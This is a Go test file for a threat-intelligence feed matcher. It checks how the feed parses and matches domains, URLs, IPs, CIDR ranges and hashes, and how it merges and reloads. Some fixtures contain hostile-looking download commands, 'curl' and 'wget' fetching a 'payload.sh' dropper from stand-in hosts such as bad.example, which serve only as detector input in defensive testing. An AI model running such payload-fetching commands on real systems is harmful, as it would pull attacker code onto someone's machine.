package intel

import (
	"path/filepath"
	"strings"
	"testing"
)

func loadString(t *testing.T, body string) *Feed {
	t.Helper()
	f, err := Parse(strings.NewReader(body), "test")
	if err != nil {
		t.Fatal(err)
	}
	return f
}

func TestClassifyAndMatch(t *testing.T) {
	f := loadString(t, `
# comment
evil.example
1.2.3.4
10.0.0.0/8|botnet range
http://bad.example/payload.sh|dropper
44d88612fea8a8f36de82e1278abb02f|eicar-md5
`)
	if f.Count() != 5 {
		t.Fatalf("expected 5 indicators, got %d (%+v)", f.Count(), f.CountByKind())
	}
	// domain + subdomain
	if h := f.MatchText("curl http://cdn.evil.example/x"); len(h) == 0 {
		t.Errorf("expected subdomain match for evil.example")
	}
	// url exact
	if h := f.MatchText("wget http://bad.example/payload.sh -O /tmp/x"); len(h) == 0 {
		t.Errorf("expected url match")
	}
	// ip literal
	if h := f.MatchText("connect 1.2.3.4 now"); len(h) == 0 {
		t.Errorf("expected ip match")
	}
	// cidr membership
	if h := f.MatchText("ssh 10.1.2.3"); len(h) == 0 {
		t.Errorf("expected cidr match for 10.1.2.3")
	}
	// hash
	if lbl, ok := f.MatchHash("44D88612FEA8A8F36DE82E1278ABB02F"); !ok || lbl != "eicar-md5" {
		t.Errorf("expected hash match, got %q %v", lbl, ok)
	}
}

func TestMembershipOnlyNoFalsePositive(t *testing.T) {
	f := loadString(t, "evil.example\n")
	if h := f.MatchText("curl https://example.com and https://good.org"); len(h) != 0 {
		t.Fatalf("unlisted domains must not match, got %+v", h)
	}
	// Must not match a bare TLD or parent of an unrelated domain.
	if h := f.MatchText("visit notevil.example.net"); len(h) != 0 {
		t.Fatalf("example.net must not match evil.example, got %+v", h)
	}
}

func TestMergeAndSaveRoundtrip(t *testing.T) {
	a := loadString(t, "1.1.1.1|a\n")
	b := loadString(t, "2.2.2.2|b\nevil.test|c\n")
	added := a.Merge(b)
	if added != 2 {
		t.Fatalf("expected 2 new indicators merged, got %d", added)
	}
	dir := t.TempDir()
	path := filepath.Join(dir, "feed.txt")
	if err := a.Save(path); err != nil {
		t.Fatal(err)
	}
	reload, ok, err := Load(path)
	if err != nil || !ok {
		t.Fatalf("reload failed: ok=%v err=%v", ok, err)
	}
	if reload.Count() != 3 {
		t.Fatalf("expected 3 after roundtrip, got %d", reload.Count())
	}
	if _, _, hit := reload.matchHost("2.2.2.2"); !hit {
		t.Errorf("merged ip lost in roundtrip")
	}
}

func TestLoadMissingIsNotError(t *testing.T) {
	f, ok, err := Load(filepath.Join(t.TempDir(), "nope.txt"))
	if err != nil || ok {
		t.Fatalf("missing feed should be (empty,false,nil), got ok=%v err=%v", ok, err)
	}
	if f.Count() != 0 {
		t.Errorf("missing feed should be empty")
	}
}
